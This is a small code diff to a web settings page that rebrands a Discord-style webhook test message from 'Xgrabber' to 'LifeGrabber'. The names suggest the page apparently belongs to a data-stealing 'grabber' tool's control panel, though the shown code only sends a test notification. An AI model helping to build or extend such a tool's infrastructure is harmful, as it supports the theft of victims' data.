@@ -62,10 +62,10 @@ export default function SettingsPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: 'Xgrabber — Test',
-            description: 'Webhook test successful!',
+            title: 'LifeGrabber — Test',
+            description: 'Webhook test successful! LifeGrabber is connected.',
             color: 2201972,
-            footer: { text: `Xgrabber · ${new Date().toLocaleString()}` },
+            footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
           }],
         }),
       });
